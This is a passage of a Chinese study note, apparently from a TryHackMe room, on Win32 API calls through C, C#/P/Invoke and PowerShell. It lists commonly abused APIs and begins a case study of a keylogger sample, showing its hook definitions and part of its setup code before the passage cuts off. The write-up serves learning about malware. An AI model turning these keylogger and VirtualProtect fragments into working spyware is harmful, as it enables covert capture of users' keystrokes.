<span class="line"><span style="color: #ABB2BF">	[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Unicode</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MessageBox</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hWnd</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpText</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpCaption</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">uType</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>现在就可以把这个函数当成托管方法调用了，尽管他是非托管方法。</p>
<h2 id="API-Call-Structure-API-调用结构">API Call Structure API 调用结构</h2>
<p>API 调用是 Win32 库的第二个主要组成部分。具体的 Win32 API 调用可以参考 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API documentation</a> 和 <a target="_blank" rel="noopener" href="http://pinvoke.net/">pinvoke.net</a>。</p>
<h3 id="附加字符">附加字符</h3>
<p>API 调用功能可以通过附加一个代表性字符来扩展，这是微软 Win32 API 函数的<strong>命名约定</strong>，我们作为开发者只需要按照这个<strong>命名规则</strong>去调用正确的函数版本。</p>
<table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>表示使用 ANSI 编码的 8 位字符集</td>
</tr>
<tr>
<td>W</td>
<td>代表 Unicode 编码</td>
</tr>
<tr>
<td>Ex</td>
<td>为 API 调用提供扩展功能或输入/输出参数</td>
</tr>
</tbody>
</table>
<p>更多示例参考微软文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings">Working with Strings</a>，这个功能是为了向后兼容性准备的。</p>
<p>在之后的实践中你就会碰到很多问题了，比如说在 C 程序中，用的是 ANSI 编码，然后提供的函数没有 A 结尾的，就要手动处理函数类转换了。</p>
<h3 id="方法签名">方法签名</h3>
<p>每个 API 调用都有预定义的结构来定义其输入/输出参数。你可以在 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API index</a> 中相应的 API 文档里面找到。</p>
<p>下面是 <code>WirteProcessMemory</code> API 调用的示例，官方文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory function (memoryapi.h)</a></p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">BOOL</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E06C75; font-style: italic">in</span><span style="color: #ABB2BF">]  HANDLE  hProcess,</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]  LPVOID  lpBaseAddress,</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]  LPCVOID lpBuffer,</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]  SIZE_T  nSize,</span></span>
<span class="line"><span style="color: #ABB2BF">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<ul>
<li>[in] hProcess: 要修改的进程内存的句柄。该句柄必须对进程具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li>
<li>[in] lpBaseAddress: 一个指向指定进程中要写入数据的基地址的指针。在数据传输发生之前，系统会验证基地址和指定大小内存中的所有数据是否可用于写入访问，如果不可访问，则函数失败。</li>
<li>[in] lpBuffer: 一个指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据。</li>
<li>[in] nSize: 要写入指定进程的字节数。</li>
<li>[out] lpNumberOfBytesWritten: 一个指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 lpNumberOfBytesWritten 为 NULL，则忽略该参数。</li>
</ul>
<p>上一个房间用过这个函数，这里就把文档里的每个参数的作用复制过来了，最主要还是得看文档。</p>
<h2 id="API-Implementations-API-实现">API Implementations API 实现</h2>
<h3 id="API-实现在-C-中">API 实现在 C 中</h3>
<p>Microsoft 为 C 和 C++ 等低级编程语言提供了一套预配置的库，我们可以使用这些库来访问所需的 API 调用。这个就是上上节讲的 <code>windows.h</code> 文件，在我们的程序开头添加一个 <code>#include &lt;windows.h&gt;</code> ，导入进来就行。</p>
<p>下面是一个使用 <code>CreateWindowExA</code> 创建一个标题为“Hello THM!”的弹出窗口的示例，文档地址：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createwindowexa">CreateWindowExA function (winuser.h)</a></p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// HWND 是窗口句柄</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// CreateWindowExA 方法签名</span></span>
<span class="line"><span style="color: #E5C07B">HWND</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateWindowExA</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E06C75; font-style: italic">in</span><span style="color: #ABB2BF">]           DWORD     dwExStyle, // 窗口扩展样式（比如是否是工具窗口、是否是浮动窗口等）</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] LPCSTR    lpClassName, // 指定创建的窗口的类型或模板</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] LPCSTR    lpWindowName, // 窗口标题</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]           DWORD     dwStyle, // 窗口的标准样式（比如是否有最大化按钮、是否可以调整大小等）</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]           int       X, // X position</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]           int       Y, // Y position</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]           int       nWidth, // Width size</span></span>
<span class="line"><span style="color: #ABB2BF">  [in]           int       nHeight, // Height size</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] HWND      hWndParent, // 父窗口</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] HMENU     hMenu, // 菜单</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] HINSTANCE hInstance, // 与窗口关联的模块实例的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">  [in, optional] LPVOID    lpParam // 指向一个值的指针，允许你将一个自定义的数据结构传递给窗口</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 具体的调用代码</span></span>
<span class="line"><span style="color: #E5C07B">HWND</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">hwnd</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateWindowsEx</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	CLASS_NAME, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #98C379">L&quot;Hello THM!&quot;</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	WS_OVERLAPPEDWINDOW, </span></span>
<span class="line"><span style="color: #ABB2BF">	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	hInstance, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">	);</span></span></code></pre></div></div></figure>
<p><code>CreateWindowEx</code> 是 <code>CreateWindow</code> 的<strong>增强版本</strong>。</p>
<ul>
<li><strong>基础版本</strong>：<code>CreateWindow</code>。它提供了一组基本的窗口样式参数（<code>dwStyle</code>），足以创建大多数常见的窗口。</li>
<li><strong>扩展版本</strong>：<code>CreateWindowEx</code>。它在 <code>CreateWindow</code> 的基础上，<strong>额外</strong>添加了一个 <code>dwExStyle</code> 参数，提供了更多<strong>特殊或高级</strong>的窗口样式。</li>
</ul>
<h3 id="API-实现在-NET-and-PowerShell-中">API 实现在 .NET and PowerShell 中</h3>
<p>下面是一个示例应用程序，它使用 API 获取运行该应用程序的设备的计算机名和其他信息。</p>
<p>为了让 P/Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 <code>IntPtr</code> 来映射这些可变大小的指针和句柄。<code>HANDLE</code> 在 32 位系统上是 4 字节，在 64 位系统上是 8 字节。为了让 P/Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 <code>IntPtr</code> 来映射这些可变大小的指针和句柄。</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">	[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这里用 bool 来接收也可以，这个函数是返回成功与否</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 我也不清楚为什么给的 demo 用的 IntPtr 接收</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetComputerNameA</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpBuffer</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpnSize</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">args</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">success</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">success</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetComputerNameA</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">size</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">Console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>现在来介绍相同的方法如何在 PowerShell 中实现，我们需要创建一个方法而不是一个类，并添加一些额外的运算符。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@&quot;</span></span>
<span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span>
<span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span>
<span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span>
<span class="line"><span style="color: #98C379">&quot;@</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
<p>这些调用现在已定义，但 PowerShell 在初始化它们之前还需要一个步骤。我们必须为方法定义中每个 Win32 DLL 的指针创建一个新类型。函数 <code>Add-Type</code> 将在 <code>/temp</code> 目录中放置一个临时文件，并使用 <code>csc.exe</code> 编译所需的函数。下面是该函数的使用示例。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span></code></pre></div></div></figure>
<p>现在就能用如下的语法调用这个 API：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::&lt;Imported Call&gt;()</span></span></code></pre></div></div></figure>
<p>这个 PowerShell 和 NET 在之后的学习中会用到很多次，注意给的 demo 的区别是 PowerShell 代码通常含有 $。</p>
<h2 id="常用滥用-API">常用滥用 API</h2>
<p>Win32 库中的一些 API 调用很容易被恶意活动利用。<a target="_blank" rel="noopener" href="https://www.sans.org/white-papers/33649/">SANs</a> 和 <a target="_blank" rel="noopener" href="http://malapi.io/">MalAPI.io</a> 在内的多个组织记录和整理了所有具有恶意的可用 API 调用。下面是一些常用滥用 API 的名字和作用：</p>
<table>
<thead>
<tr>
<th><strong>API Call</strong></th>
<th><strong>Explanation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>LoadLibraryA</td>
<td>将指定的 DLL 加载到<strong>调用进程的虚拟地址空间</strong>中</td>
</tr>
<tr>
<td>GetUserNameA</td>
<td>检索与当前线程关联的用户名称</td>
</tr>
<tr>
<td>GetComputerNameA</td>
<td>检索本地计算机的 NetBIOS 或 DNS 名称</td>
</tr>
<tr>
<td>GetVersionExA</td>
<td>获取当前运行操作系统的版本信息</td>
</tr>
<tr>
<td>GetModuleFileNameA</td>
<td>检索指定模块（DLL 或 EXE）的<strong>完整路径</strong></td>
</tr>
<tr>
<td>GetStartupInfoA</td>
<td>获取当前进程的<strong>启动信息</strong></td>
</tr>
<tr>
<td>GetModuleHandle</td>
<td>如果指定的模块已被加载到当前进程的地址空间，则返回该<strong>模块的句柄</strong></td>
</tr>
<tr>
<td>GetProcAddress</td>
<td>返回指定 DLL 中<strong>导出函数</strong>的地址</td>
</tr>
<tr>
<td>VirtualProtect</td>
<td>更改调用进程<strong>虚拟地址空间中某段内存的保护属性</strong></td>
</tr>
</tbody>
</table>
<h2 id="案例学习">案例学习</h2>
<p>现在我们已经了解了 Win32 库和常用滥用 API 调用的底层实现，接下来让我们分析两个恶意软件样本，并观察它们的调用如何交互。</p>
<h3 id="键盘记录器">键盘记录器</h3>
<p>由于键盘记录器是用 C#编写的，它必须使用 P/Invoke 来获取每个调用的指针。下面是恶意软件样本源代码的 P/Invoke 定义片段。</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 将一个钩子过程（Hook Procedure）安装到 Windows 系统中的一个钩子链上</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">idHook</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpfn</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hMod</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwThreadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 从 Hook 链中移除 Hook</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">MarshalAs</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UnmanagedType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Bool</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hhk</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 如果指定的模块已映射到调用进程的地址空间中，则返回该模块的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpModuleName</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">WHKEYBOARDLL</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 返回一个伪句柄</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Auto</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetCurrentProcess</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure>
<p>下面是这个样本中 Hook 的片段</p>
<figure class="shiki c#"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">() {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // _proc 是一个回调函数，当有键盘事件发生时，Windows 会调用这个函数</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 如果钩子安装成功，SetHook 函数会返回一个钩子句柄，并存储在 _hookID 中</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_proc</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这是 C# 应用程序的消息循环</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 启动一个循环，等待和处理各种事件（如键盘事件、鼠标事件、窗口消息等）</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Run</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 当程序退出消息循环时（比如用户关闭了窗口），会调用这个函数</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 它卸载之前安装的钩子，否则钩子会一直留在内存中，导致资源泄漏</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">UnhookWindowsHookEx</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">_hookID</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 退出应用程序</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">Application</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Exit</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SetHook</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">LowLevelKeyboardProc</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">proc</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这行代码获取当前正在运行的进程。using 关键字确保 curProcess 对象在使用后会被正确地释放</span></span>
